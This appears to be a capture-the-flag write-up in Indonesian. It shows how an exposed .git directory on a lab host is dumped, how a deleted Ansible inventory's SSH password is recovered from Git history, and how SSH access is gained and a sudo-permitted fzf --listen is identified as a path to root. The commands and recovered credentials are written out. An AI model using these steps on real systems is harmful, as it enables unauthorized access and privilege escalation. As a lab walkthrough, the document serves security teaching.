# Forgotten Commit (Root) — Analisis

[← Overview](01-forgotten-commit-root.md) · [Index](index.md)

### 2.1 Webroot dan eksposur `.git`

Situs utama hanya halaman statis, tetapi response untuk `/.git/HEAD` tidak 404.
Ini indikasi klasik bahwa seluruh direktori `.git` ikut ter-deploy ke webroot.
Alih-alih menebak file satu per satu, seluruh repository ditarik dengan
`git-dumper`:

```bash
git-dumper http://10.10.20.21/ /tmp/nexus_repo
```

Hasilnya adalah repository dengan **5 commit**. `git-dumper` mengambil object
Git yang masih tersedia, lalu merekonstruksi working tree dan history.

### 2.2 History Git membocorkan inventory Ansible

Commit terbaru menghapus file inventory, tetapi Git menyimpan versi sebelumnya.
Urutan yang relevan:

```text
3f4c118 (HEAD -> main) Remove Ansible inventory
bff2915 Add deployment inventory
```

Commit `3f4c118` menghapus `ansible/inventory.ini`. Commit induknya, `bff2915`,
masih berisi:

```ini
[web]
srv.nexus.internal ansible_user=leonardo ansible_password="Dev0pment#2026!"
```

Ini adalah **credential leak dari history Git**: file dihapus di commit baru,
tetapi object lama tetap ada dan bisa dibaca dengan `git show`.

```bash
git -C /tmp/nexus_repo show bff2915:ansible/inventory.ini
```

### 2.3 Foothold SSH sebagai `leonardo`

Kredensial dari inventory dipakai untuk SSH:

```bash
ssh leonardo@10.10.20.21
# password: Dev0pment#2026!
```

Setelah masuk:

```bash
id
cat /home/leonardo/user.txt
```

Output yang tercatat:

```text
uid=1000(leonardo) gid=1000(leonardo) groups=1000(leonardo)
NFX{g1t_h1story_s3cr3ts_l34d_t0_ssh}
```

User flag ini bukan flag challenge Root, tetapi merupakan bukti bahwa jalur
foothold berhasil dan prasyarat untuk enumerasi lokal terpenuhi.

### 2.4 Enumerasi sudo

Langkah pertama setelah mendapat shell user adalah membaca hak sudo tanpa
password:

```bash
sudo -n -l
```

Output yang tercatat:

```text
User leonardo may run the following commands on ...:
    (root) NOPASSWD: /usr/local/bin/fzf --listen 1337
```

Hanya satu entri, dan cukup untuk root. `fzf` adalah fuzzy finder, tetapi versi
0.74.3 memiliki fitur **remote control**: dengan `--listen`, fzf membuka HTTP
server yang menerima *actions* dari proses lain. Salah satu action-nya adalah
`execute(...)`, yang menjalankan command shell.

Karena fzf dijalankan via `sudo`, proses fzf dan command yang dijalankannya
berjalan sebagai **root**. HTTP listener-nya hanya bound ke loopback, tetapi
`leonardo` sudah punya shell lokal, jadi loopback bukan batas keamanan.
